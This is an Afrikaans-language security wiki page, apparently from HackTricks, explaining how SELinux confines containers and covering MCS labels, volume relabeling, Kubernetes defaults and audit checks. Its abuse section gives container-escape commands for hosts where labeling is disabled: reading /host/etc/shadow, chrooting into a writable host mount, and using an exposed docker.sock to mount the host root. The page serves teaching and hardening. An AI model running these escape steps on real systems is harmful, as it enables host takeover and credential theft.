# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Oorsig

SELinux is 'n **label-gebaseerde Mandatory Access Control**-stelsel. Elke relevante proses en objek kan 'n sekuriteitskonteks hê, en die beleid bepaal watter domeine met watter tipes mag interaksie hê en op watter manier. In containerized environments beteken dit gewoonlik dat die runtime die container-proses binne 'n beperkte container-domein begin en die container-inhoud met ooreenstemmende tipes label. As die beleid behoorlik werk, kan die proses dalk die dinge lees en skryf waaraan daar verwag word dat sy label toegang het, terwyl toegang tot ander host-inhoud geweier word, selfs al word daardie inhoud deur 'n mount sigbaar.

Dit is een van die kragtigste host-side protections wat in mainstream Linux-container deployments beskikbaar is. Dit is veral belangrik op Fedora, RHEL, CentOS Stream, OpenShift en ander SELinux-gesentreerde ecosystems. In daardie environments sal 'n reviewer wat SELinux ignoreer, dikwels verkeerd verstaan waarom 'n oënskynlik voor-die-hand-liggende pad na host compromise eintlik geblokkeer word.

## AppArmor Teenoor SELinux

Die maklikste hoëvlakverskil is dat AppArmor path-based is, terwyl SELinux **label-based** is. Dit het groot gevolge vir container security. 'n Path-based policy kan anders optree as dieselfde host-inhoud onder 'n onverwagte mount path sigbaar word. 'n Label-based policy vra eerder wat die objek se label is en wat die prosesdomein daarmee mag doen. Dit maak SELinux nie eenvoudig nie, maar dit maak dit wel bestand teen 'n klas van path-trick-aannames wat defenders soms per ongeluk in AppArmor-gebaseerde systems maak.

Omdat die model label-georiënteerd is, is container volume handling en relabeling-besluite security-critical. As die runtime of operator labels te breed verander om "mounts te laat werk", kan die policy boundary wat veronderstel was om die workload te bevat, baie swakker as bedoel word.

## Lab

Om te sien of SELinux aktief is op die host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Om bestaande labels op die host te inspekteer:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Om ’n normale uitvoering te vergelyk met een waar etikettering gedeaktiveer is:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Op ’n SELinux-geaktiveerde host is dit ’n baie praktiese demonstrasie, omdat dit die verskil toon tussen ’n workload wat onder die verwagte container-domein loop en een waarvan daardie enforcement-laag verwyder is.

## Gebruik tydens uitvoering

Podman is besonder goed met SELinux geïntegreer op stelsels waar SELinux deel van die platform se verstekkonfigurasie is. Rootless Podman plus SELinux is een van die sterkste algemene container-basisse, omdat die proses reeds aan die host-kant onbevoorreg is en steeds deur MAC-beleid beperk word. Docker kan ook SELinux gebruik waar dit ondersteun word, hoewel administrateurs dit soms deaktiveer om probleme met volume-labeling te omseil. CRI-O en OpenShift steun sterk op SELinux as deel van hul container-isolasie. Kubernetes kan ook SELinux-verwante instellings blootstel, maar die waarde daarvan hang natuurlik daarvan af of die node-OS SELinux werklik ondersteun en afdwing.<sup>[[2]](#references)</sup>

Die herhalende les is dat SELinux nie ’n opsionele versiering is nie. In die ecosystems wat daaromheen gebou is, is dit deel van die verwagte security boundary. Vir host-side policy enumeration, transition analysis en misbruik van SELinux-administrasietools, sien die [algemene SELinux-bladsy](../../../interesting-files-permissions/selinux.md).

## MCS-kategorieë en Volume Relabeling

Container-isolasie is normaalweg ’n kombinasie van **type enforcement** en **Multi-Category Security (MCS)**. Twee prosesse kan albei as `container_t` loop, maar verskillende vlakke ontvang, soos `s0:c123,c456` en `s0:c321,c654`. Private container-inhoud word as `container_file_t` met die ooreenstemmende kategorieë gelabel, sodat die blote bereiking van ’n ander container se path nie genoeg is om toegang daartoe te verkry nie. Runtimes ken normaalweg die kategoriepaar toe; deur ’n vlak doelbewus handmatig te hergebruik, word hierdie per-container-skeiding opgehef.<sup>[[3]](#references)</sup>

Vergelyk eerder die proses- en mount-labels as om slegs die tipe na te gaan:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Bind-mount-agtervoegsels verander gasheer-inode-etikette en verander dus die sekuriteitsgrens, nie net mount-metadata nie:<sup>[[3]](#references)</sup>

- `:Z` pas ’n private etiket met die container se MCS-kategorieë toe. Dit is geskik vir ’n volume wat deur een container of Pod besit word.
- `:z` pas ’n gedeelde etiket toe sodat ander beperkte containers ook die inhoud kan gebruik (onderhewig aan DAC-permissies). As dit vir secrets of tenant-spesifieke data gebruik word, verwyder dit die MCS-isolasie wat andersins containers van mekaar sou skei.
- Heretikettering is rekursief. Deur enige opsie op breë gasheerbome soos `/`, `/etc`, `/usr` of ’n hele home-boom toe te pas, kan inhoud aan die geselekteerde container blootgestel word en kan gasheerdienste wat die verwagte etikette benodig, ophou werk nadat dit vervang is.

Handmatige vlakhergebruik is maklik om in command lines en manifests raak te sien. Die volgende twee containers ontvang doelbewus dieselfde MCS-vlak en kan daarom inhoud gebruik wat vir daardie vlak geëtiketteer is:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Onderskei ook `label=nested` van `label=disable`: eersgenoemde stel SELinux-bewerkings binne die container bloot en laat label-veranderings slegs toe waar die policy dit toelaat, terwyl laasgenoemde label-skeiding vir daardie workload verwyder. Albei verdien hersiening, maar hulle is nie ekwivalent nie.<sup>[[3]](#references)</sup>

## Wankonfigurasies

Die klassieke fout is `label=disable`. Operasioneel gebeur dit dikwels omdat ’n volume mount geweier is en die vinnigste korttermynantwoord was om SELinux uit die vergelyking te verwyder eerder as om die labeling-model reg te stel.<sup>[[1]](#references)</sup> ’n Ander algemene fout is verkeerde relabeling van host-inhoud. Breë relabel-bewerkings kan die toepassing laat werk, maar dit kan ook uitbrei waaraan die container mag raak, tot ver buite wat oorspronklik bedoel is.

Dit is ook belangrik om nie **geïnstalleerde** SELinux met **effektiewe** SELinux te verwar nie. ’n Host kan SELinux ondersteun en steeds in permissive mode wees, of die runtime kan die workload nie onder die verwagte domain begin nie. In daardie gevalle is die beskerming baie swakker as wat die dokumentasie moontlik aandui.

## Misbruik

Wanneer SELinux afwesig, permissive of breedweg vir die workload gedeaktiveer is, word host-mounted paths baie makliker misbruik. Dieselfde bind mount wat andersins deur labels beperk sou word, kan ’n direkte weg na host-data of host-wysiging word. Dit is veral relevant wanneer dit gekombineer word met writable volume mounts, container runtime directories of operasionele kortpaaie wat sensitiewe host paths vir gerief blootstel.

SELinux verduidelik dikwels waarom ’n generiese breakout writeup onmiddellik op een host werk, maar herhaaldelik op ’n ander misluk, selfs al lyk die runtime flags soortgelyk. Die ontbrekende bestanddeel is dikwels nie ’n namespace of ’n capability nie, maar ’n label-grens wat behoue gebly het.

Die vinnigste praktiese toets is om die aktiewe context te vergelyk en dan gemounte host paths of runtime directories te toets wat normaalweg deur labels beperk sou word:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
As ’n host bind mount teenwoordig is en SELinux labeling gedeaktiveer of verswak is, kom inligtingsopenbaarmaking dikwels eerste:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
As die mount skryfbaar is en die container vanuit die kernel se oogpunt effektief host-root is, is die volgende stap om beheerde host-wysiging te toets eerder as om te raai:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Op SELinux-bekwame hosts kan die verlies van labels rondom runtime-staatgidse ook direkte privilege-escalation-paaie blootlê:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Hierdie opdragte vervang nie ’n volledige escape chain nie, maar dit maak baie vinnig duidelik of SELinux die rede was waarom toegang tot host-data of wysiging van lêers aan die host-kant verhoed is.

### Volledige voorbeeld: SELinux gedeaktiveer + skryfbare host-mount

As SELinux-labeling gedeaktiveer is en die host-lêerstelsel skryfbaar by `/host` gemount is, word ’n volledige host escape ’n normale geval van bind-mount-misbruik:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
As die `chroot` slaag, werk die houerproses nou vanaf die gasheer se lêerstelsel:
```bash
id
hostname
cat /etc/passwd | tail
```
### Volledige voorbeeld: SELinux gedeaktiveer + Runtime-gids

As die werklading toegang tot ’n runtime socket kan verkry sodra labels gedeaktiveer is, kan die escape aan die runtime oorgedra word:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Die relevante waarneming is dat SELinux dikwels die beheermaatreël was wat presies hierdie soort toegang tot host-paaie of runtime-state verhinder het.

## Kontroles

Die doel van die SELinux-kontroles is om te bevestig dat SELinux geaktiveer is, die huidige sekuriteitskonteks te identifiseer, en vas te stel of die lêers of paaie waarin jy belangstel, werklik deur labels beperk word.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Wat hier interessant is:

- `getenforce` behoort ideaal gesproke `Enforcing` terug te gee; `Permissive` of `Disabled` verander die betekenis van die hele SELinux-afdeling.
- As die huidige process context onverwags of te wyd lyk, loop die workload moontlik nie onder die bedoelde container policy nie.
- As host-gemonteerde lêers of runtime-gidse labels het waartoe die process te vrylik toegang het, word bind mounts baie gevaarliker.

Wanneer jy ’n container op ’n SELinux-bekwame platform hersien, moenie labeling as ’n sekondêre detail beskou nie. In baie gevalle is dit een van die hoofredes waarom die host nog nie gekompromitteer is nie.

## Runtime-verstekwaardes

| Runtime / platform | Verstektoestand | Verstekgedrag | Algemene handmatige verswakking |
| --- | --- | --- | --- |
| Docker Engine | Host-afhanklik | SELinux-skeiding is beskikbaar op SELinux-geaktiveerde hosts, maar die presiese gedrag hang van die host-/daemon-konfigurasie af | `--security-opt label=disable`, breë relabeling van bind mounts, `--privileged` |
| Podman | Gewoonlik geaktiveer op SELinux-hosts | SELinux-skeiding is ’n normale deel van Podman op SELinux-stelsels, tensy dit gedeaktiveer is | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Runtime-toegeken op SELinux-nodes; eksplisiet konfigureerbaar | Die runtime kan ’n unieke label toeken wanneer die Pod nie een stel nie. Eksplisiete `securityContext.seLinuxOptions` beheer die Pod-/volume-label; op Kubernetes 1.37 gebruik geskikte volumes by verstek SELinux-mount-labeling | gedupliseerde MCS-vlakke, permissive/disabled nodes, breë bevoorregte workloads, onoordeelkundige `seLinuxChangePolicy: Recursive` <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / OpenShift-styl deployments | Daar word gewoonlik sterk daarop gesteun | SELinux is dikwels ’n kernonderdeel van die node-isolasiemodel in hierdie omgewings | pasgemaakte policies wat toegang te wyd maak, die deaktivering van labeling vir verenigbaarheid |

SELinux-verstekwaardes is meer verspreidingsafhanklik as seccomp-verstekwaardes. Op Fedora/RHEL/OpenShift-styl stelsels is SELinux dikwels sentraal tot die isolasiemodel. Op nie-SELinux-stelsels is dit eenvoudig afwesig.

## Kubernetes 1.37 Volume-labeling

Kubernetes 1.37 het `SELinuxMount` stabiel gemaak en dit by verstek geaktiveer. Vir ’n geskikte PVC, ’n Pod met `seLinuxOptions`, en ’n CSI-driver wat `.spec.seLinuxMount: true` adverteer, gebruik kubelet `-o context=<label>` in plaas daarvan om die runtime te vra om elke inode rekursief te relabel. Ongesteunde drivers en volumetipes gebruik steeds die rekursiewe pad. Dit vermy ’n groot relabel-bewerking en voorkom ook dat die permanente labels van elke lêer verander word bloot om die volume aan ’n Pod beskikbaar te stel.<sup>[[2]](#references)[[4]](#references)</sup>

’n Mount kan slegs een sodanige konteks dra. Gevolglik bestaan Pods met **verskillende SELinux-labels** wat dieselfde geskikte volume op dieselfde node gebruik, nie meer saam onder die verstek-`MountOption`-gedrag nie: een bly in `ContainerCreating` met ’n `conflicting SELinux labels of volume`-fout. Beskou dit as sowel ’n beskikbaarheidskwessie as ’n nuttige aanduiding dat workloads implisiet storage oor MCS-grense heen gedeel het. As daardie deling opsetlik is—for example, ’n bevoorregte `spc_t` Pod en ’n confined Pod wat dieselfde volume gebruik—is die per-Pod-verenigbaarheidsuitsondering `seLinuxChangePolicy: Recursive`; moenie dit clusterwyd toepas sonder om te verstaan watter paaie die runtime sal relabel nie.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Nuttige cluster-side-kontroles:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
Die opsionele kube-controller-manager `selinux-warning-controller` bespeur Pods wat ’n volume met onversoenbare labels deel en stel die `selinux_warning_controller_selinux_volume_conflict`-metriek beskikbaar. Aktiveer en hersien dit voor opgraderings of voordat volume-etiketgedrag verander word; dit help om ’n werklike beleidskonflik van ’n gewone CSI- of lêerstelselfout te onderskei.<sup>[[2]](#references)</sup>

## References

- [1] [Podman-dokumentasie: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Stel ’n sekuriteitskonteks vir ’n Pod of houer op](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Podman run-dokumentasie: SELinux-labels en volume-heretikettering](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes v1.37-vrystelling: SELinuxMount en SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
